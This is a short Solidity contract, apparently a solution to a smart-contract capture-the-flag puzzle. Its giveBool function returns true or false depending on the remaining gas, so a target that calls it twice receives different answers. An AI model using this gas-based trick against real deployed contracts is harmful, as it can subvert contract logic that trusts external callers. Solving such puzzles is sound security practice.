// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";

interface IBoolGiver {
  function giveBool() external view returns (bool);
}

contract TrueXorQuillAttack is IBoolGiver {
  function giveBool() external view returns (bool) {
    console.log(gasleft());
    return gasleft() > 71000;
  }
}
